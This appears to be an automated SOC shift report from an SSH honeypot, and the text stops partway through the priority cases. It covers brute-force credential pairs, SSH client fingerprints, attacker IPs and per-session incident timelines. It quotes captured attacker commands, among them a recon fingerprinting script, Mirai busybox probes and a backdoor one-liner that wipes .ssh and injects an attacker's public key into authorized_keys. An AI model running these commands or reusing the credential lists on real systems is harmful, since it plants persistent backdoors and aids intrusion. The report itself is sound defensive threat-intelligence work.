# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-22 |
| **Generated At** | 2026-08-22T18:37:22Z |
| **Shift Time** | 18:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **186** |
| Confirmed Threats | **163** |
| False Positives Filtered | **23** (12.4%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **34** |
| High Severity Cases | **125** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **61** |
| Malware Samples Analyzed | **2** HIGH · **18** MED · 24 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **141** |
| Unique Credential Pairs | **100** |
| Unique Usernames | **18** |
| Unique Passwords | **67** |
| Successful Auth Pairs | **134** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 27 |
| `admin` | 25 |
| `unknown` | 18 |
| `ubuntu` | 12 |
| `centos` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1q2w3e4r` | 7 |
| `12345` | 6 |
| `password` | 6 |
| `guest2019` | 6 |
| `centos2000` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `guest` | `guest2019` | 6 |
| `centos` | `centos2000` | 6 |
| `ubnt` | `ubnt2012` | 6 |
| `unknown` | `1q2w3e4r` | 5 |
| `admin` | `admin2018` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456789` | `195.178.110.232` | 2026-08-22T14:56:21 |
| `supervisor` | `12345` | `42.248.129.234` | 2026-08-22T14:56:39 |
| `supervisor` | `12345` | `46.201.247.21` | 2026-08-22T14:56:48 |
| `root` | `1q2w3e4r` | `195.178.110.232` | 2026-08-22T14:58:30 |
| `ubuntu` | `Passw0rd!` | `217.60.255.130` | 2026-08-22T14:59:33 |
| `root` | `!Qaz2wsx` | `217.60.255.130` | 2026-08-22T14:59:42 |
| `root` | `654321` | `195.178.110.232` | 2026-08-22T15:00:32 |
| `unknown` | `1q2w3e4r` | `213.33.204.130` | 2026-08-22T15:01:44 |
| `root` | `P@ssw0rd` | `195.178.110.232` | 2026-08-22T15:03:06 |
| `root` | `admin` | `195.178.110.232` | 2026-08-22T15:05:04 |
| `root` | `admin123` | `195.178.110.232` | 2026-08-22T15:06:55 |
| `root` | `passw0rd` | `195.178.110.232` | 2026-08-22T15:08:37 |
| `admin` | `admin2018` | `10.0.0.73` | 2026-08-22T15:08:47 |
| `ubuntu` | `P4ssw0rd` | `217.60.255.130` | 2026-08-22T15:09:30 |
| `root` | `1q@W3e$R` | `217.60.255.130` | 2026-08-22T15:09:40 |
| `root` | `password` | `195.178.110.232` | 2026-08-22T15:10:12 |
| `admin` | `admin2018` | `218.58.73.238` | 2026-08-22T15:10:24 |
| `unknown` | `abcd1234` | `121.22.99.2` | 2026-08-22T15:11:59 |
| `root` | `password1` | `195.178.110.232` | 2026-08-22T15:11:59 |
| `unknown` | `abcd1234` | `135.23.190.48` | 2026-08-22T15:12:06 |
| `unknown` | `abcd1234` | `210.4.68.73` | 2026-08-22T15:12:15 |
| `unknown` | `abcd1234` | `223.82.86.2` | 2026-08-22T15:12:25 |
| `unknown` | `1q2w3e4r` | `10.0.0.73` | 2026-08-22T15:12:56 |
| `root` | `qwerty` | `195.178.110.232` | 2026-08-22T15:13:36 |
| `root` | `root123` | `195.178.110.232` | 2026-08-22T15:15:28 |
| `root` | `toor` | `195.178.110.232` | 2026-08-22T15:17:04 |
| `admin` | `000000` | `195.178.110.232` | 2026-08-22T15:18:30 |
| `ubuntu` | `abc` | `217.60.255.130` | 2026-08-22T15:19:33 |
| `root` | `1234!@#$` | `217.60.255.130` | 2026-08-22T15:19:44 |
| `admin` | `111111` | `195.178.110.232` | 2026-08-22T15:20:21 |
| `admin` | `123` | `195.178.110.232` | 2026-08-22T15:22:02 |
| `admin` | `123123` | `195.178.110.232` | 2026-08-22T15:23:22 |
| `admin` | `1234` | `195.178.110.232` | 2026-08-22T15:24:52 |
| `admin` | `admin2018` | `46.201.247.21` | 2026-08-22T15:25:52 |
| `admin` | `12345` | `195.178.110.232` | 2026-08-22T15:26:11 |
| `guest` | `guest2019` | `10.0.0.73` | 2026-08-22T15:26:51 |
| `admin` | `123456` | `195.178.110.232` | 2026-08-22T15:27:25 |
| `admin` | `1234567` | `195.178.110.232` | 2026-08-22T15:28:35 |
| `unknown` | `1q2w3e4r` | `121.1.120.2` | 2026-08-22T15:29:31 |
| `ubuntu` | `long@123` | `217.60.255.130` | 2026-08-22T15:29:35 |
| `unknown` | `1q2w3e4r` | `80.191.253.228` | 2026-08-22T15:29:38 |
| `root` | `andrew23` | `217.60.255.130` | 2026-08-22T15:29:39 |
| `admin` | `12345678` | `195.178.110.232` | 2026-08-22T15:29:54 |
| `admin` | `123456789` | `195.178.110.232` | 2026-08-22T15:31:17 |
| `admin` | `1q2w3e4r` | `195.178.110.232` | 2026-08-22T15:32:48 |
| `admin` | `654321` | `195.178.110.232` | 2026-08-22T15:34:09 |
| `admin` | `Admin123` | `195.178.110.232` | 2026-08-22T15:35:31 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-22T15:36:22 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-22T15:36:22 |
| `admin` | `P@ssw0rd` | `195.178.110.232` | 2026-08-22T15:36:53 |
| `admin` | `admin` | `195.178.110.232` | 2026-08-22T15:38:17 |
| `ubuntu` | `Password123@` | `217.60.255.130` | 2026-08-22T15:39:25 |
| `root` | `p@ss123` | `217.60.255.130` | 2026-08-22T15:39:29 |
| `admin` | `passw0rd` | `195.178.110.232` | 2026-08-22T15:39:53 |
| `root` | `GM8182` | `195.158.88.156` | 2026-08-22T15:41:11 |
| `centos` | `centos2000` | `10.0.0.73` | 2026-08-22T15:41:28 |
| `admin` | `password` | `195.178.110.232` | 2026-08-22T15:41:33 |
| `centos` | `centos2000` | `220.246.46.144` | 2026-08-22T15:42:51 |
| `centos` | `centos2000` | `211.53.58.10` | 2026-08-22T15:43:03 |
| `admin` | `password1` | `195.178.110.232` | 2026-08-22T15:43:13 |
| `admin` | `qwerty` | `195.178.110.232` | 2026-08-22T15:44:32 |
| `guest` | `guest2019` | `45.178.227.0` | 2026-08-22T15:44:35 |
| `guest` | `guest2019` | `65.20.179.251` | 2026-08-22T15:44:43 |
| `guest` | `guest2019` | `61.79.227.51` | 2026-08-22T15:44:47 |
| `guest` | `guest2019` | `85.137.242.4` | 2026-08-22T15:44:58 |
| `unknown` | `unknown2018` | `10.0.0.73` | 2026-08-22T15:45:44 |
| `admin1` | `123123` | `195.178.110.232` | 2026-08-22T15:45:52 |
| `admin1` | `12345` | `195.178.110.232` | 2026-08-22T15:47:19 |
| `admin1` | `123456` | `195.178.110.232` | 2026-08-22T15:48:36 |
| `ubuntu` | `Asdf$1234` | `217.60.255.130` | 2026-08-22T15:49:35 |
| `root` | `ubuntu@1234` | `217.60.255.130` | 2026-08-22T15:49:39 |
| `admin1` | `password` | `195.178.110.232` | 2026-08-22T15:49:53 |
| `bd` | `123` | `173.249.52.138` | 2026-08-22T15:50:52 |
| `345gs5662d34` | `345gs5662d34` | `173.249.52.138` | 2026-08-22T15:50:55 |
| `bd` | `3245gs5662d34` | `173.249.52.138` | 2026-08-22T15:50:55 |
| `administrator` | `123123` | `195.178.110.232` | 2026-08-22T15:51:06 |
| `administrator` | `12345` | `195.178.110.232` | 2026-08-22T15:52:19 |
| `administrator` | `123456` | `195.178.110.232` | 2026-08-22T15:53:42 |
| `administrator` | `1234567` | `195.178.110.232` | 2026-08-22T15:55:05 |
| `administrator` | `12345678` | `195.178.110.232` | 2026-08-22T15:56:27 |
| `administrator` | `123456789` | `195.178.110.232` | 2026-08-22T15:57:48 |
| `centos` | `centos2000` | `46.4.112.25` | 2026-08-22T15:58:27 |
| `centos` | `centos2000` | `177.174.0.3` | 2026-08-22T15:58:34 |
| `administrator` | `password` | `195.178.110.232` | 2026-08-22T15:59:16 |
| `ubuntu` | `Abc123!@#` | `217.60.255.130` | 2026-08-22T15:59:42 |
| `root` | `debian@1234` | `217.60.255.130` | 2026-08-22T15:59:47 |
| `apache` | `12345678` | `195.178.110.232` | 2026-08-22T16:00:53 |
| `unknown` | `unknown2018` | `72.24.210.58` | 2026-08-22T16:02:15 |
| `unknown` | `unknown2018` | `138.84.59.192` | 2026-08-22T16:02:24 |
| `apache` | `password` | `195.178.110.232` | 2026-08-22T16:02:30 |
| `backup` | `123` | `195.178.110.232` | 2026-08-22T16:04:13 |
| `backup` | `12345678` | `195.178.110.232` | 2026-08-22T16:05:35 |
| `backup` | `backup` | `195.178.110.232` | 2026-08-22T16:06:51 |
| `ubnt` | `ubnt2012` | `189.52.52.162` | 2026-08-22T16:07:12 |
| `ubnt` | `ubnt2012` | `64.33.178.57` | 2026-08-22T16:07:20 |
| `backup` | `backup123` | `195.178.110.232` | 2026-08-22T16:08:03 |
| `backup` | `password` | `195.178.110.232` | 2026-08-22T16:09:17 |
| `ubuntu` | `dns2022` | `217.60.255.130` | 2026-08-22T16:09:49 |
| `root` | `wsadmin` | `217.60.255.130` | 2026-08-22T16:09:53 |
| `centos` | `12345678` | `195.178.110.232` | 2026-08-22T16:10:35 |
| `centos` | `654321` | `195.178.110.232` | 2026-08-22T16:12:03 |
| `centos` | `centos` | `195.178.110.232` | 2026-08-22T16:13:29 |
| `centos` | `centos123` | `195.178.110.232` | 2026-08-22T16:14:51 |
| `blank` | `blank2008` | `120.243.121.6` | 2026-08-22T16:15:29 |
| `blank` | `blank2008` | `201.28.234.10` | 2026-08-22T16:15:38 |
| `debian` | `111111` | `195.178.110.232` | 2026-08-22T16:16:12 |
| `config` | `config2000` | `154.20.33.172` | 2026-08-22T16:17:21 |
| `config` | `config2000` | `103.171.39.147` | 2026-08-22T16:17:29 |
| `config` | `config2000` | `27.223.98.117` | 2026-08-22T16:17:34 |
| `debian` | `123123` | `195.178.110.232` | 2026-08-22T16:17:34 |
| `config` | `config2000` | `27.115.72.122` | 2026-08-22T16:17:44 |
| `ubnt` | `ubnt2012` | `10.0.0.73` | 2026-08-22T16:18:20 |
| `debian` | `12345` | `195.178.110.232` | 2026-08-22T16:19:02 |
| `ubuntu` | `abc@123` | `217.60.255.130` | 2026-08-22T16:20:00 |
| `root` | `1234@` | `217.60.255.130` | 2026-08-22T16:20:04 |
| `admin` | `admin` | `41.63.63.211` | 2026-08-22T16:25:35 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-22T16:25:36 |
| `ubuntu` | `P@ssword123` | `217.60.255.130` | 2026-08-22T16:30:01 |
| `root` | `1qaz@WSX3edc$RFV` | `217.60.255.130` | 2026-08-22T16:30:06 |
| `blank` | `blank2008` | `101.13.1.58` | 2026-08-22T16:31:07 |
| `unknown` | `unknown2016` | `10.0.0.73` | 2026-08-22T16:32:24 |
| `ubnt` | `ubnt2012` | `185.246.217.106` | 2026-08-22T16:34:56 |
| `ubnt` | `ubnt2012` | `182.75.234.236` | 2026-08-22T16:35:04 |
| `support` | `support` | `10.0.0.73` | 2026-08-22T16:39:21 |
| `support` | `support2024` | `210.195.205.7` | 2026-08-22T16:39:55 |
| `ubuntu` | `qwerty12345` | `217.60.255.130` | 2026-08-22T16:40:07 |
| `root` | `Asiatech@1234` | `217.60.255.130` | 2026-08-22T16:40:11 |
| `unknown` | `unknown2000` | `165.99.71.193` | 2026-08-22T16:48:01 |
| `unknown` | `unknown2000` | `121.99.190.167` | 2026-08-22T16:48:11 |
| `unknown` | `unknown2016` | `182.42.113.10` | 2026-08-22T16:50:02 |
| `ubuntu` | `Admin@123456` | `217.60.255.130` | 2026-08-22T16:50:03 |
| `root` | `Armaghan@123` | `217.60.255.130` | 2026-08-22T16:50:10 |
| `unknown` | `unknown2016` | `203.252.10.4` | 2026-08-22T16:50:11 |
| `support` | `support2024` | `10.0.0.73` | 2026-08-22T16:51:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **186** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 58 |
| OpenSSH | 37 |
| libssh | 35 |
| Paramiko (Python) | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 56 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 37 | 36 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `a2de0f306611...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 56 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 37 | 36 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 2 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 56 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.232`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
cat /proc/mounts; /bin/busybox EWSTE
```
Source IPs: `195.158.88.156`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `173.249.52.138`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **71** |
| High-Risk ASNs | **57** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS3786` | LG DACOM Corporation | 2 | HIGH |
| `AS6849` | JSC Ukrtelecom | 2 | HIGH |
| `AS266705` | GABRIEL FRANCISCO ERBETTA Y MARIANO ANDRES CARRIZO RICHELET SOCIEDAD DE HECHO (TELNET SOLUCIONES) | 2 | HIGH |
| `AS15735` | GO p.l.c. | 1 | HIGH |
| `AS58224` | Iran Telecommunication Company PJS | 1 | HIGH |
| `AS43273` | Optik Line LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (125)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bbf16d8d3418

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 14:56 |
| **Last Seen** | 2026-08-22 14:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 14:56:19` | `cowrie.session.connect` |
| `2026-08-22 14:56:20` | `cowrie.client.version` |
| `2026-08-22 14:56:20` | `cowrie.client.kex` |
| `2026-08-22 14:56:21` | `cowrie.login.success` |
| `2026-08-22 14:56:22` | `cowrie.session.params` |
| `2026-08-22 14:56:22` | `cowrie.command.input` |
| `2026-08-22 14:56:22` | `cowrie.command.input` |
| `2026-08-22 14:56:22` | `cowrie.command.input` |
| `2026-08-22 14:56:22` | `cowrie.command.input` |
| `2026-08-22 14:56:22` | `cowrie.command.input` |
| `2026-08-22 14:56:22` | `cowrie.command.success` |
| `2026-08-22 14:56:22` | `cowrie.command.input` |
| `2026-08-22 14:56:22` | `cowrie.command.input` |
| `2026-08-22 14:56:22` | `cowrie.command.input` |
| `2026-08-22 14:56:22` | `cowrie.command.input` |
| `2026-08-22 14:56:22` | `cowrie.log.closed` |
| `2026-08-22 14:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71658c600af2

| Field | Detail |
|---|---|
| **Source IP** | `42.248.129[.]234` |
| **First Seen** | 2026-08-22 14:56 |
| **Last Seen** | 2026-08-22 14:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 14:56:36` | `cowrie.session.connect` |
| `2026-08-22 14:56:37` | `cowrie.client.version` |
| `2026-08-22 14:56:37` | `cowrie.client.kex` |
| `2026-08-22 14:56:39` | `cowrie.login.success` |
| `2026-08-22 14:56:40` | `cowrie.direct-tcpip.request` |
| `2026-08-22 14:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.248.129[.]234` to AbuseIPDB if not already reported
- [ ] Block `42.248.129[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5715068d0073

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-08-22 14:56 |
| **Last Seen** | 2026-08-22 14:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 14:56:46` | `cowrie.session.connect` |
| `2026-08-22 14:56:47` | `cowrie.client.version` |
| `2026-08-22 14:56:47` | `cowrie.client.kex` |
| `2026-08-22 14:56:48` | `cowrie.login.success` |
| `2026-08-22 14:56:48` | `cowrie.direct-tcpip.request` |
| `2026-08-22 14:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f22b9d59b53

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 14:58 |
| **Last Seen** | 2026-08-22 14:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 14:58:26` | `cowrie.session.connect` |
| `2026-08-22 14:58:27` | `cowrie.client.version` |
| `2026-08-22 14:58:27` | `cowrie.client.kex` |
| `2026-08-22 14:58:30` | `cowrie.login.success` |
| `2026-08-22 14:58:32` | `cowrie.session.params` |
| `2026-08-22 14:58:32` | `cowrie.command.input` |
| `2026-08-22 14:58:32` | `cowrie.command.input` |
| `2026-08-22 14:58:32` | `cowrie.command.input` |
| `2026-08-22 14:58:32` | `cowrie.command.input` |
| `2026-08-22 14:58:32` | `cowrie.command.input` |
| `2026-08-22 14:58:32` | `cowrie.command.success` |
| `2026-08-22 14:58:32` | `cowrie.command.input` |
| `2026-08-22 14:58:32` | `cowrie.command.input` |
| `2026-08-22 14:58:32` | `cowrie.command.input` |
| `2026-08-22 14:58:32` | `cowrie.command.input` |
| `2026-08-22 14:58:33` | `cowrie.log.closed` |
| `2026-08-22 14:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86b010e57f39

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 14:59 |
| **Last Seen** | 2026-08-22 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 14:59:32` | `cowrie.session.connect` |
| `2026-08-22 14:59:32` | `cowrie.client.version` |
| `2026-08-22 14:59:32` | `cowrie.client.kex` |
| `2026-08-22 14:59:33` | `cowrie.login.success` |
| `2026-08-22 14:59:33` | `cowrie.direct-tcpip.request` |
| `2026-08-22 14:59:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 14:59:33` | `cowrie.direct-tcpip.data` |
| `2026-08-22 14:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4eb8476674d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 14:59 |
| **Last Seen** | 2026-08-22 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 14:59:41` | `cowrie.session.connect` |
| `2026-08-22 14:59:41` | `cowrie.client.version` |
| `2026-08-22 14:59:42` | `cowrie.client.kex` |
| `2026-08-22 14:59:42` | `cowrie.login.success` |
| `2026-08-22 14:59:43` | `cowrie.direct-tcpip.request` |
| `2026-08-22 14:59:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 14:59:43` | `cowrie.direct-tcpip.data` |
| `2026-08-22 14:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa74b842209

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:00 |
| **Last Seen** | 2026-08-22 15:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:00:29` | `cowrie.session.connect` |
| `2026-08-22 15:00:30` | `cowrie.client.version` |
| `2026-08-22 15:00:30` | `cowrie.client.kex` |
| `2026-08-22 15:00:32` | `cowrie.login.success` |
| `2026-08-22 15:00:34` | `cowrie.session.params` |
| `2026-08-22 15:00:34` | `cowrie.command.input` |
| `2026-08-22 15:00:34` | `cowrie.command.input` |
| `2026-08-22 15:00:34` | `cowrie.command.input` |
| `2026-08-22 15:00:34` | `cowrie.command.input` |
| `2026-08-22 15:00:34` | `cowrie.command.input` |
| `2026-08-22 15:00:34` | `cowrie.command.success` |
| `2026-08-22 15:00:34` | `cowrie.command.input` |
| `2026-08-22 15:00:34` | `cowrie.command.input` |
| `2026-08-22 15:00:34` | `cowrie.command.input` |
| `2026-08-22 15:00:34` | `cowrie.command.input` |
| `2026-08-22 15:00:35` | `cowrie.log.closed` |
| `2026-08-22 15:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
